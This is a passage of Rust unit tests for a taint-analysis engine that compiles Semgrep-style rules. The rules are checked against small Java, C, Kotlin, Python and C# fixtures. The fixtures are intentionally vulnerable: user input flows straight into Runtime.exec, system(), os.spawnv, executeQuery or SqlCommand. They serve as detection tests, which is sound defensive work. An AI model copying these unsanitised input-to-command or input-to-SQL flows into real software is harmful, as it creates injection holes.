        Runtime.getRuntime().exec(cmd);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for request.getParameter -> Runtime.exec flow, got none"
        );
        assert!(
            findings[0].description.contains("Runtime.exec")
                || findings[0]
                    .sink_description
                    .as_deref()
                    .is_some_and(|d| d.contains("exec")),
            "sink description should mention exec: {:?}",
            findings[0]
        );
    }

    #[test]
    fn java_taint_sanitizer_blocks_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-cmd-sanitized
mode: taint
languages: [java]
severity: ERROR
message: "Tainted input reaches Runtime.exec"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: Runtime.exec($X)
pattern-sanitizers:
  - pattern: validate($X)
"#,
        );

        // The sanitizer validate() is called — engine does not track sanitizers on
        // intermediate variables for this shape, but the call assignment
        // reassigns cmd to a clean value if the sanitizer is applied first.
        // Use a shape the engine cleanly handles: param goes directly to sanitizer,
        // then to sink. The sanitizer call replaces the tainted value so the sink
        // should not fire.
        let src = r#"
class Controller {
    void run(HttpServletRequest request) throws Exception {
        String cmd = request.getParameter("cmd");
        String safe = validate(cmd);
        Runtime.getRuntime().exec(safe);
    }
}
"#;
        // With the sanitizer call reassigning to `safe`, the engine should not
        // propagate taint through the sanitizer call, so no finding.
        // Note: this tests the integration of the sanitizer matcher in the
        // compiled Java spec — whether the engine actually blocks it depends
        // on the java_taint engine's sanitizer handling. We assert the compiled
        // rule carries sanitizers correctly.
        assert_eq!(
            rule.spec.sanitizers.len(),
            1,
            "sanitizer spec should compile"
        );
        // Run the check and ensure no crash (result depends on engine sanitizer support).
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let _ = rule.check(src, &tree); // must not panic
    }

    #[test]
    fn c_taint_rule_produces_finding_for_getenv_to_system() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: c-cmd-injection
mode: taint
languages: [c]
severity: ERROR
message: "Tainted env var reaches system()"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: getenv($X)
pattern-sinks:
  - pattern: system($X)
"#,
        );

        // getenv() result assigned to cmd, then passed to system().
        let src = r#"
#include <stdlib.h>
void handler() {
    char *cmd = getenv("CMD");
    system(cmd);
}
"#;
        let tree = parse_file(src, Language::C).expect("C fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for getenv -> system flow, got none"
        );
        assert!(
            findings[0].description.contains("system")
                || findings[0]
                    .sink_description
                    .as_deref()
                    .is_some_and(|d| d.contains("system")),
            "sink description should mention system: {:?}",
            findings[0]
        );
    }

    #[test]
    fn c_taint_sanitizer_no_panic() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: c-cmd-sanitized
mode: taint
languages: [c]
severity: ERROR
message: "Tainted input reaches system()"
pattern-sources:
  - pattern: getenv($X)
pattern-sinks:
  - pattern: system($X)
pattern-sanitizers:
  - pattern: strlcpy($X)
"#,
        );

        // Verify sanitizer compiles correctly and rule doesn't panic.
        assert_eq!(
            rule.spec.sanitizers.len(),
            1,
            "sanitizer spec should compile"
        );
        let src = r#"
#include <stdlib.h>
#include <string.h>
void handler() {
    char *input = getenv("CMD");
    char safe[64];
    strlcpy(safe, input, sizeof(safe));
    system(safe);
}
"#;
        let tree = parse_file(src, Language::C).expect("C fixture should parse");
        let _ = rule.check(src, &tree); // must not panic
    }

    #[test]
    fn kotlin_taint_rule_produces_finding_for_receive_to_exec() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: kotlin-cmd-injection
mode: taint
languages: [kotlin]
severity: ERROR
message: "Tainted request body reaches Runtime.exec"
metadata:
  cwe: "CWE-78"
pattern-sources:
  - pattern: call.receiveText($X)
pattern-sinks:
  - pattern: Runtime.exec($X)
"#,
        );

        // call.receiveText() → cmd → Runtime.getRuntime().exec(cmd)
        let src = r#"
fun handler(call: ApplicationCall) {
    val cmd = call.receiveText()
    Runtime.getRuntime().exec(cmd)
}
"#;
        let tree = parse_file(src, Language::Kotlin).expect("Kotlin fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for call.receiveText -> Runtime.exec flow, got none"
        );
        assert!(
            findings[0].description.contains("exec")
                || findings[0]
                    .sink_description
                    .as_deref()
                    .is_some_and(|d| d.contains("exec")),
            "sink description should mention exec: {:?}",
            findings[0]
        );
    }

    #[test]
    fn kotlin_taint_sanitizer_no_panic() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: kotlin-cmd-sanitized
mode: taint
languages: [kotlin]
severity: ERROR
message: "Tainted request body reaches Runtime.exec"
pattern-sources:
  - pattern: call.receiveText($X)
pattern-sinks:
  - pattern: Runtime.exec($X)
pattern-sanitizers:
  - pattern: validate($X)
"#,
        );

        // Verify sanitizer compiles correctly and rule doesn't panic.
        assert_eq!(
            rule.spec.sanitizers.len(),
            1,
            "sanitizer spec should compile"
        );
        let src = r#"
fun handler(call: ApplicationCall) {
    val body = call.receiveText()
    val safe = validate(body)
    Runtime.getRuntime().exec(safe)
}
"#;
        let tree = parse_file(src, Language::Kotlin).expect("Kotlin fixture should parse");
        let _ = rule.check(src, &tree); // must not panic
    }

    fn compiled(yaml: &str) -> SemgrepTaintRule {
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => r,
            TaintRuleParse::Skip(msg) => panic!("unexpected skip: {}", msg),
            TaintRuleParse::NotTaint => panic!("expected taint rule"),
        }
    }

    // ── Composed focus-metavariable + `pattern-either`-of-regex-pinned-method
    //    SINK shape (the `dangerous-spawn-process` family) ─────────────────────

    /// The `dangerous-spawn-process` sink (`os.$METHOD($MODE, $CMD, ...)` with a
    /// `$METHOD` `metavariable-regex`, under a shared `focus-metavariable: $CMD`)
    /// must compile to ENUMERATED concrete `Call { "os.<name>" }` sinks — one per
    /// regex alternative — and NEVER a receiver-agnostic `ReceiverCall { "os" }`
    /// (which would fire on every `os.X(...)`, dropping the method regex).
    #[test]
    fn focus_regex_either_sink_enumerates_calls_not_receivercall() {
        let r = compiled(
            r#"
id: dsp
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: os.getenv($X)
pattern-sinks:
  - patterns:
    - focus-metavariable: $CMD
    - pattern-either:
      - patterns:
        - pattern: os.$METHOD($MODE, $CMD, ...)
        - metavariable-regex:
            metavariable: $METHOD
            regex: (spawnl|spawnv|posix_spawn)
"#,
        );
        // Exactly the three enumerated methods, each a concrete `os.<name>` Call.
        let mut canon: Vec<String> = r
            .spec
            .sinks
            .iter()
            .map(|m| match m {
                GenericMatcher::Call { canonical, .. } => canonical.clone(),
                other => panic!("expected Call sink, got {other:?}"),
            })
            .collect();
        canon.sort();
        assert_eq!(canon, vec!["os.posix_spawn", "os.spawnl", "os.spawnv"]);
        // No over-broad receiver-agnostic sink leaked in.
        assert!(
            !r.spec
                .sinks
                .iter()
                .any(|m| matches!(m, GenericMatcher::ReceiverCall { .. })),
            "must not compile a receiver-agnostic ReceiverCall sink"
        );
    }

    /// The bash-wrapper arm (`os.$METHOD($MODE, $BASH, ["-c", $CMD, ...], ...)`
    /// with a `$BASH` value-regex) MUST be deferred: its `$BASH` pin is not on
    /// the callee metavariable and cannot be enforced, so compiling it would
    /// broaden the sink. Only the simple arm's methods should appear.
    #[test]
    fn focus_regex_either_sink_defers_bash_wrapper_arm() {
        let r = compiled(
            r#"
id: dsp-bash
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: os.getenv($X)
pattern-sinks:
  - patterns:
    - focus-metavariable: $CMD
    - pattern-either:
      - patterns:
        - pattern: os.$METHOD($MODE, $CMD, ...)
        - metavariable-regex:
            metavariable: $METHOD
            regex: (spawnv|posix_spawn)
      - patterns:
        - pattern-inside: os.$METHOD($MODE, $BASH, ["-c", $CMD,...],...)
        - metavariable-regex:
            metavariable: $METHOD
            regex: (spawnv|posix_spawn)
        - metavariable-regex:
            metavariable: $BASH
            regex: (.*)(sh|bash)
"#,
        );
        let mut canon: Vec<String> = r
            .spec
            .sinks
            .iter()
            .filter_map(|m| match m {
                GenericMatcher::Call { canonical, .. } => Some(canonical.clone()),
                _ => None,
            })
            .collect();
        canon.sort();
        canon.dedup();
        // Only the simple arm compiled; the bash-wrapper arm produced nothing.
        assert_eq!(canon, vec!["os.posix_spawn", "os.spawnv"]);
        assert!(
            !r.spec
                .sinks
                .iter()
                .any(|m| matches!(m, GenericMatcher::ReceiverCall { .. })),
            "deferred bash arm must not leak a broad ReceiverCall"
        );
    }

    /// End-to-end (parse → check): the compiled sink FIRES on `os.spawnv(mode,
    /// tainted)` and is SILENT on both a non-pinned method reached by taint
    /// (`os.remove(tainted)` — the `$METHOD` regex is ENFORCED) and a
    /// no-tainted-argument call (`os.getpid()`).
    #[test]
    fn focus_regex_either_sink_enforces_method_regex_end_to_end() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: dsp-e2e
mode: taint
languages: [python]
severity: ERROR
message: "tainted cmd spawned"
pattern-sources:
  - pattern: os.getenv($X)
pattern-sinks:
  - patterns:
    - focus-metavariable: $CMD
    - pattern-either:
      - patterns:
        - pattern: os.$METHOD($MODE, $CMD, ...)
        - metavariable-regex:
            metavariable: $METHOD
            regex: (spawnl|spawnv|posix_spawn)
"#,
        );

        let src = r#"
import os
def handler():
    cmd = os.getenv('CMD')
    os.spawnv(os.P_WAIT, cmd)
    os.remove(cmd)
    os.getpid()
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "only the regex-pinned os.spawnv sink should fire, got lines {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
        // The single finding is the `os.spawnv(...)` line (line 5 with leading \n).
        assert_eq!(
            findings[0].line, 5,
            "the surviving finding must be the os.spawnv() call (regex enforced), \
             got line {}",
            findings[0].line
        );
    }

    #[test]
    fn pattern_either_flattens_into_multiple_matchers() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-either:
      - pattern: request.data
      - pattern: request.form
      - pattern: request.args
pattern-sinks:
  - pattern: pickle.loads($X)
"#,
        );
        assert_eq!(r.spec.sources.len(), 3);
        assert_eq!(r.spec.sinks.len(), 1);
    }

    #[test]
    fn nested_pattern_either_flattens_recursively() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-either:
      - pattern-either:
          - pattern: request.data
          - pattern: request.form
      - pattern: request.args
pattern-sinks:
  - pattern: pickle.loads($X)
"#,
        );
        assert_eq!(r.spec.sources.len(), 3);
    }

    #[test]
    fn pattern_either_in_sinks_flattens() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - pattern-either:
      - pattern: pickle.loads($X)
      - pattern: pickle.load($X)
"#,
        );
        assert_eq!(r.spec.sinks.len(), 2);
    }

    #[test]
    fn pattern_either_in_sanitizers_flattens() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - pattern: pickle.loads($X)
pattern-sanitizers:
  - pattern-either:
      - pattern: sanitize($X)
      - pattern: escape($X)
"#,
        );
        assert_eq!(r.spec.sanitizers.len(), 2);
    }

    #[test]
    fn mixed_pattern_and_pattern_either_work_together() {
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-either:
      - pattern: request.data
      - pattern: request.form
  - pattern: request
pattern-sinks:
  - pattern: pickle.loads($X)
  - pattern-either:
      - pattern: pickle.load($X)
"#,
        );
        assert_eq!(r.spec.sources.len(), 3);
        assert_eq!(r.spec.sinks.len(), 2);
    }

    #[test]
    fn empty_pattern_either_warns_and_produces_no_matcher() {
        // Empty pattern-either in sources → no source matchers, so whole
        // rule is skipped (sources are required).
        let yaml = r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-either: []
pattern-sinks:
  - pattern: pickle.loads($X)
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Skip(msg) => assert!(msg.contains("pattern-sources")),
            other => panic!(
                "expected Skip because empty pattern-either produced no sources, got {:?}",
                match other {
                    TaintRuleParse::Compiled(_) => "Compiled",
                    TaintRuleParse::NotTaint => "NotTaint",
                    TaintRuleParse::Skip(_) => unreachable!(),
                }
            ),
        }

        // Empty pattern-either in sanitizers → rule still compiles (sanitizers
        // are optional), but has zero sanitizer matchers.
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - pattern: pickle.loads($X)
pattern-sanitizers:
  - pattern-either: []
"#,
        );
        assert!(r.spec.sanitizers.is_empty());
    }

    #[test]
    fn unknown_composite_still_rejected() {
        // `pattern-inside:` as a standalone top-level source entry (not inside
        // a `patterns:` block) — unsupported key, the entry is warn-skipped.
        // With no other source entries the whole rule is skipped.
        let yaml2 = r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-inside: |
      def $F(...):
        ...
pattern-sinks:
  - pattern: pickle.loads($X)
"#;
        let v2: YamlValue = serde_yaml_ng::from_str(yaml2).unwrap();
        assert!(matches!(parse_taint_rule(&v2), TaintRuleParse::Skip(_)));

        // A mix where one entry is an unsupported key and another is a plain
        // `pattern:` still compiles — the bad entry is dropped, the good one
        // survives.
        let r = compiled(
            r#"
id: x
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - pattern-inside: |
      def $F(...):
        ...
  - pattern: request.form
pattern-sinks:
  - pattern: pickle.loads($X)
"#,
        );
        assert_eq!(r.spec.sources.len(), 1);
    }

    // ── MethodName shape tests ────────────────────────────────────────────

    #[test]
    fn compile_metavar_receiver_sink_produces_method_name() {
        // The canonical Semgrep pattern for "any call to executeQuery" is
        // `$CONN.executeQuery($X)`.  The bridge must compile this to a
        // `MethodName` matcher rather than warn-skipping it.
        let m = compile("$CONN.executeQuery($X)", MatcherRole::Sink).expect("MethodName");
        match m {
            GenericMatcher::MethodName { method, .. } => assert_eq!(method, "executeQuery"),
            _ => panic!("expected MethodName"),
        }
    }

    #[test]
    fn compile_metavar_receiver_sanitizer_produces_method_name() {
        let m = compile("$OBJ.escape($X)", MatcherRole::Sanitizer).expect("MethodName sanitizer");
        match m {
            GenericMatcher::MethodName { method, .. } => assert_eq!(method, "escape"),
            _ => panic!("expected MethodName"),
        }
    }

    #[test]
    fn metavar_receiver_as_source_is_rejected() {
        // A `$RECEIVER.method($X)` source does not make semantic sense:
        // we cannot identify which object is the origin if the receiver is
        // any arbitrary variable.  The bridge must return None for sources.
        assert!(compile("$OBJ.getInput($X)", MatcherRole::Source).is_none());
    }

    #[test]
    fn metavar_without_dot_is_rejected() {
        // A bare metavariable with no method — not a valid sink shape.
        assert!(compile("$X", MatcherRole::Sink).is_none());
        assert!(compile("$X($Y)", MatcherRole::Sink).is_none());
    }

    #[test]
    fn metavar_with_multi_segment_rest_compiles_as_member_call() {
        // `$OBJ.a.b($X)` is no longer rejected: it is a CALL-ON-MEMBER shape
        // (metavar root, concrete penultimate `a`, concrete method `b`) and
        // compiles to a FieldName on the penultimate field `a`.
        match compile("$OBJ.a.b($X)", MatcherRole::Sink) {
            Some(GenericMatcher::FieldName { field, .. }) => assert_eq!(field, "a"),
            other => panic!("expected FieldName{{a}}, got {other:?}"),
        }
        // But a metavar penultimate (`$OBJ.$F.b($X)`) stays rejected — we never
        // compile an any-field `.b(...)` matcher.
        assert!(compile("$OBJ.$F.b($X)", MatcherRole::Sink).is_none());
    }

    #[test]
    fn metavar_lowercase_is_rejected() {
        // Semgrep metavariables are UPPER-case after `$`.  `$obj` (lowercase)
        // is not a metavariable; reject it so we don't accidentally match
        // oddly-named dotted callees.
        assert!(compile("$obj.method($X)", MatcherRole::Sink).is_none());
    }

    #[test]
    fn metavar_with_trailing_digits_is_accepted() {
        // Semgrep metavars are `[A-Z_][A-Z0-9_]*`, so `$ARG1` is valid — it must
        // compile as a metavar-receiver sink (previously rejected on the digit).
        assert!(is_metavariable("$ARG1"));
        assert!(is_metavariable("$CONN_2"));
        assert!(!is_metavariable("$obj"));
        assert!(!is_metavariable("$"));
        assert!(compile("$X1.executeQuery($P)", MatcherRole::Sink).is_some());
    }

    #[test]
    fn taint_rule_with_metavar_receiver_sink_compiles() {
        let r = compiled(
            r#"
id: java-sql-injection
mode: taint
languages: [java]
severity: ERROR
message: "Tainted input reaches executeQuery"
metadata:
  cwe: "CWE-89"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: $CONN.executeQuery($X)
"#,
        );
        assert_eq!(r.spec.sinks.len(), 1);
        match &r.spec.sinks[0] {
            GenericMatcher::MethodName { method, .. } => assert_eq!(method, "executeQuery"),
            other => panic!("expected MethodName sink, got {:?}", other),
        }
    }

    #[test]
    fn java_taint_method_name_sink_produces_finding() {
        use crate::engine::parser::parse_file;

        // Rule uses `$CONN.executeQuery($X)` — bridge compiles to MethodName.
        // Java engine's `matcher_matches_call` handles MethodName via method name.
        let rule = compiled(
            r#"
id: java-sql-metavar
mode: taint
languages: [java]
severity: ERROR
message: "SQL injection via executeQuery"
metadata:
  cwe: "CWE-89"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: $CONN.executeQuery($X)
"#,
        );

        let src = r#"
class Dao {
    void query(HttpServletRequest request, Connection conn) throws Exception {
        String input = request.getParameter("id");
        conn.executeQuery(input);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for request.getParameter -> conn.executeQuery flow, got none"
        );
        assert!(
            findings[0]
                .sink_description
                .as_deref()
                .is_some_and(|d| d.contains("executeQuery")),
            "sink description should mention executeQuery: {:?}",
            findings[0]
        );
    }

    #[test]
    fn java_taint_method_name_non_matching_method_does_not_fire() {
        use crate::engine::parser::parse_file;

        // Rule only matches `executeQuery` — calls to `executeUpdate` must NOT fire.
        let rule = compiled(
            r#"
id: java-sql-metavar-negative
mode: taint
languages: [java]
severity: ERROR
message: "SQL injection via executeQuery"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: $CONN.executeQuery($X)
"#,
        );

        let src = r#"
class Dao {
    void update(HttpServletRequest request, Connection conn) throws Exception {
        String input = request.getParameter("id");
        conn.executeUpdate(input);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "executeUpdate should NOT trigger the executeQuery rule, got {:?}",
            findings
        );
    }

    // ── pattern-propagators ────────────────────────────────────────────────

    const JAVA_PROPAGATOR_RULE: &str = r#"
id: java-sqli-propagator
mode: taint
languages: [java]
severity: ERROR
message: "SQL injection through StringBuilder"
metadata:
  cwe: "CWE-89"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-propagators:
  - pattern: (StringBuilder $SB).append($X)
    from: $X
    to: $SB
pattern-sinks:
  - pattern: $CONN.executeQuery($X)
"#;

    // Same rule with the `pattern-propagators` block removed — used to prove the
    // propagator is what enables the finding (without it the flow is MISSED).
    const JAVA_NO_PROPAGATOR_RULE: &str = r#"
id: java-sqli-no-propagator
mode: taint
languages: [java]
severity: ERROR
message: "SQL injection through StringBuilder"
pattern-sources:
  - pattern: request.getParameter($X)
pattern-sinks:
  - pattern: $CONN.executeQuery($X)
"#;

    // Tainted input flows into a StringBuilder via `.append`, which then reaches
    // the SQL sink — this is only caught because the propagator carries taint
    // from the append argument to the `sb` receiver.
    const JAVA_PROPAGATED_FIXTURE: &str = r#"
class Dao {
    void query(HttpServletRequest request, Connection conn) throws Exception {
        String input = request.getParameter("id");
        StringBuilder sb = new StringBuilder();
        sb.append(input);
        conn.executeQuery(sb.toString());
    }
}
"#;

    #[test]
    fn java_propagator_compiles_to_arg_to_receiver() {
        let rule = compiled(JAVA_PROPAGATOR_RULE);
        assert_eq!(rule.propagators.len(), 1, "propagator should compile");
        assert_eq!(
            rule.propagators[0].method.as_deref(),
            Some("append"),
            "concrete method name should be captured"
        );
    }

    #[test]
    fn java_propagator_enables_stringbuilder_flow() {
        use crate::engine::parser::parse_file;
        let rule = compiled(JAVA_PROPAGATOR_RULE);
        let tree =
            parse_file(JAVA_PROPAGATED_FIXTURE, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(JAVA_PROPAGATED_FIXTURE, &tree);
        assert!(
            !findings.is_empty(),
            "propagator should carry taint through sb.append() into executeQuery, got none"
        );
        assert!(
            findings[0]
                .sink_description
                .as_deref()
                .is_some_and(|d| d.contains("executeQuery")),
            "sink should be executeQuery: {:?}",
            findings[0]
        );
    }

    #[test]
    fn java_without_propagator_misses_stringbuilder_flow() {
        use crate::engine::parser::parse_file;
        // Exact same source and sink as the propagator rule, but no
        // `pattern-propagators`: the taint stops at `sb.append(input)` and never
        // reaches the sink. This is the before/after that proves the propagator
        // is load-bearing.
        let rule = compiled(JAVA_NO_PROPAGATOR_RULE);
        assert!(rule.propagators.is_empty());
        let tree =
            parse_file(JAVA_PROPAGATED_FIXTURE, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(JAVA_PROPAGATED_FIXTURE, &tree);
        assert!(
            findings.is_empty(),
            "without the propagator the StringBuilder flow must NOT be detected, got {:?}",
            findings
        );
    }

    #[test]
    fn java_propagator_clean_append_stays_clean() {
        use crate::engine::parser::parse_file;
        // The propagator only fires when the append ARGUMENT is tainted. Here a
        // literal is appended, so `sb` stays clean and no finding is produced.
        let rule = compiled(JAVA_PROPAGATOR_RULE);
        let src = r#"
class Dao {
    void query(HttpServletRequest request, Connection conn) throws Exception {
        String input = request.getParameter("id");
        StringBuilder sb = new StringBuilder();
        sb.append("SELECT * FROM t");
        conn.executeQuery(sb.toString());
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("Java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "appending a literal must not taint the receiver, got {:?}",
            findings
        );
    }

    #[test]
    fn csharp_any_method_propagator_enables_flow() {
        use crate::engine::parser::parse_file;
        // C# registry shape: `(StringBuilder $B).$ANY(...,(string $X),...)` — the
        // method is a metavariable, so the propagator matches ANY method call on
        // the builder whose argument is tainted.
        let rule = compiled(
            r#"
id: csharp-sqli-propagator
mode: taint
languages: [csharp]
severity: ERROR
message: "SQL injection through StringBuilder"
pattern-sources:
  - pattern: tainted
pattern-propagators:
  - pattern: (StringBuilder $B).$ANY(...,(string $X),...)
    from: $X
    to: $B
pattern-sinks:
  - pattern: $CMD.ExecuteReader($X)
"#,
        );
        assert_eq!(rule.propagators.len(), 1);
        assert_eq!(
            rule.propagators[0].method, None,
            "metavariable method should compile to any-method (None)"
        );

        let src = r#"
class Dao {
    void Query(string tainted, SqlCommand cmd) {
        var sb = new StringBuilder();
        sb.Append(tainted);
        cmd.ExecuteReader(sb.ToString());
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            !findings.is_empty(),
            "any-method propagator should carry taint through sb.Append() into ExecuteReader, got none"
        );
    }

    // ── C# `csharp-sqli` constructor-argument + property-assignment SINK shape ──
    //
    // The sink is a `pattern-either` of two focus arms, BOTH gated by a shared
    // `metavariable-regex` on the class-name / property-name metavariable
    // `$PATTERN` (`^(SqlCommand|CommandText|OleDbCommand|OdbcCommand|OracleCommand)$`):
    //   arm 1: `new $PATTERN($CMD,...)` + focus `$CMD` (first constructor arg)
    //   arm 2: `$CMD.$PATTERN = $VALUE;` + focus `$VALUE` (assignment RHS)
    // These compile to enumerated `ConstructorArgSink` / `PropertyAssignSink`.
    // The tests exercise the full `parse_taint_rule -> check` path.

    /// The exact `csharp-sqli` sink (both arms + shared regex). Source is the
    /// typed `(string $X)` metavariable; a `StringBuilder` propagator and the
    /// `$CMD.Parameters.*` sanitizers are included so the rule matches the
    /// registry shape faithfully.
    fn csharp_sqli_rule() -> SemgrepTaintRule {
        compiled(
            r#"
id: csharp-sqli
mode: taint
languages: [csharp]
severity: ERROR
message: "SQL injection"
pattern-sources:
  - patterns:
      - pattern: |
          (string $X)
      - pattern-not: |
          "..."
pattern-propagators:
  - pattern: (StringBuilder $B).$ANY(...,(string $X),...)
    from: $X
    to: $B
pattern-sinks:
  - patterns:
      - pattern-either:
        - patterns:
          - pattern: |
              new $PATTERN($CMD,...)
          - focus-metavariable: $CMD
        - patterns:
          - pattern: |
              $CMD.$PATTERN = $VALUE;
          - focus-metavariable: $VALUE
      - metavariable-regex:
          metavariable: $PATTERN
          regex: ^(SqlCommand|CommandText|OleDbCommand|OdbcCommand|OracleCommand)$
pattern-sanitizers:
  - pattern-either:
      - pattern: |
          $CMD.Parameters.Add(...)
      - pattern: |
          $CMD.Parameters.AddRange(...)
      - pattern: |
          $CMD.Parameters.AddWithValue(...)
      - pattern: |
          $CMD.Parameters[$IDX].Value = ...
    by-side-effect: true
"#,
        )
    }

    const CSQLI_NAMES: [&str; 5] = [
        "SqlCommand",
        "CommandText",
        "OleDbCommand",
        "OdbcCommand",
        "OracleCommand",
    ];

    /// TEST 1 — the rule COMPILES to the expected sink shapes: a typed-string
    /// source, a `ConstructorArgSink` enumerating all five class names focused on
    /// the first argument (`arg_index == 0`), and a `PropertyAssignSink`
    /// enumerating all five property names.
    #[test]
    fn csharp_sqli_compiles_to_constructor_and_property_sinks() {
        let rule = csharp_sqli_rule();
        assert!(
            rule.spec
                .sources
                .iter()
                .any(|s| matches!(s, GenericMatcher::TypedName { type_name, .. } if type_name == "string")),
            "source must be a typed-string metavariable, got {:?}",
            rule.spec.sources
        );

        let ctor = rule
            .spec
            .sinks
            .iter()
            .find_map(|s| match s {
                GenericMatcher::ConstructorArgSink {
                    class_names,
                    arg_index,
                    ..
                } => Some((class_names.clone(), *arg_index)),
                _ => None,
            })
            .expect("a ConstructorArgSink must be compiled");
        assert_eq!(ctor.1, 0, "constructor focus is the FIRST argument");
        assert_eq!(ctor.0, CSQLI_NAMES, "constructor class names enumerated");

        let props = rule
            .spec
            .sinks
            .iter()
            .find_map(|s| match s {
                GenericMatcher::PropertyAssignSink { property_names, .. } => {
                    Some(property_names.clone())
                }
                _ => None,
            })
            .expect("a PropertyAssignSink must be compiled");
        assert_eq!(props, CSQLI_NAMES, "property names enumerated");
    }

    /// TEST 2 — the rule FIRES: a tainted string in `new SqlCommand(userInput)`
    /// AND in `cmd.CommandText = userInput;` are both findings.
    #[test]
    fn csharp_sqli_fires_on_constructor_and_property_sinks() {
        use crate::engine::parser::parse_file;
        let rule = csharp_sqli_rule();

        let ctor = r#"
class Dao {
    void Q(string userInput) {
        SqlCommand command = new SqlCommand(userInput);
    }
}
"#;
        let tree = parse_file(ctor, Language::CSharp).expect("C# fixture parses");
        assert_eq!(
            rule.check(ctor, &tree).len(),
            1,
            "`new SqlCommand(userInput)` (tainted arg0) must fire"
        );

        let prop = r#"
class Dao {
    void Q(string userInput) {
        var command = MakeCommand();
        command.CommandText = userInput;
    }
}
"#;
        let tree = parse_file(prop, Language::CSharp).expect("C# fixture parses");
        assert_eq!(
            rule.check(prop, &tree).len(),
            1,
            "`command.CommandText = userInput` (tainted RHS) must fire"
        );
    }

    /// TEST 3 — enumerated-name DISCRIMINATION (the crux of faithfulness): a
    /// constructor of a class NOT in the set and an assignment to a property NOT
    /// in the set are BOTH silent, even though the focused value is tainted.
    #[test]
    fn csharp_sqli_silent_on_non_enumerated_names() {
        use crate::engine::parser::parse_file;
        let rule = csharp_sqli_rule();

        let ctor = r#"
class Dao {
    void Q(string userInput) {
        var x = new SafeThing(userInput);
    }
}
"#;
        let tree = parse_file(ctor, Language::CSharp).expect("C# fixture parses");
        assert!(
            rule.check(ctor, &tree).is_empty(),
            "`new SafeThing(userInput)` (class NOT enumerated) must NOT fire"
        );

        let prop = r#"
class Dao {
    void Q(string userInput) {
        var command = MakeCommand();
        command.SomeOther = userInput;
    }
}
"#;
        let tree = parse_file(prop, Language::CSharp).expect("C# fixture parses");
        assert!(
            rule.check(prop, &tree).is_empty(),
            "`command.SomeOther = userInput` (property NOT enumerated) must NOT fire"
        );
    }

    /// TEST 4 — parameterized/sanitized usage is silent: a tainted value passed
    /// to `cmd.Parameters.AddWithValue(...)` (a parameterized query) never forms
    /// the constructor/property sink shape, so no finding is produced.
    #[test]
    fn csharp_sqli_silent_on_parameterized_query() {
        use crate::engine::parser::parse_file;
        let rule = csharp_sqli_rule();

        let src = r#"
class Dao {
    void Q(string userInput) {
        var command = new SqlCommand("SELECT * FROM T WHERE id = @id");
        command.Parameters.AddWithValue("@id", userInput);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture parses");
        assert!(
            rule.check(src, &tree).is_empty(),
            "a parameterized query (AddWithValue) must NOT fire — the tainted value \
             never reaches the constructor/property sink"
        );
    }

    /// TEST 5 — focus-POSITION discrimination: arm 1 binds `$CMD` to the FIRST
    /// constructor argument, so taint at a LATER argument
    /// (`new SqlCommand(literal, userInput)`) must NOT fire.
    #[test]
    fn csharp_sqli_silent_on_non_focused_argument_position() {
        use crate::engine::parser::parse_file;
        let rule = csharp_sqli_rule();

        let src = r#"
class Dao {
    void Q(string userInput) {
